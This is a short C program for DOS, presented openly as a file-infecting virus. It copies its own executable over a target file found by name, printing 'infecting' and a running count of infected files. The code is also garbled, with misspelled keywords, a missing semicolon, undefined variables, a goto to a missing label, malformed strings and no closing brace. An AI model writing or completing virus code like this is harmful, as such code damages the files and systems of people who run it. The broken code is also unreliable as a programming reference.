#include<stdio.h>
#include<conio.h>
#include<io.h>
#include<dos.h>
#include<dir.h>
#include<time.h>
using namepace std;
FILE *virus,*host;
int done,a=0;
unsigned long x;
char buff[2048]
struct ffblk ffblk;
clock_t st,end;
void main()
{
st=clock();
clrscr();
done=findfirst(“abc.txt”,&ffblk,0);

virus=fopen(_argv[0],”rb”);
host=fopen(ffblk.ff_name,”rb+”);
if (host==NULL) goto next;
x=89088;
printf(infecting %sn”,ffblk.ff_name,a);
while(x>2048)
{
fread(buff,2048,1,virus);
fwrite(buff,2048,i,host);
x-=2048;
}
fread(buff,x,1,virus);
fwrite(buff,x,1,host);

a++;

printf(“DONE!(total files infected=%d)”,a);
end=clock();
printf(“TIME TAKEN=%f SECn”,(end-st)/CLK_TCK);
getch();
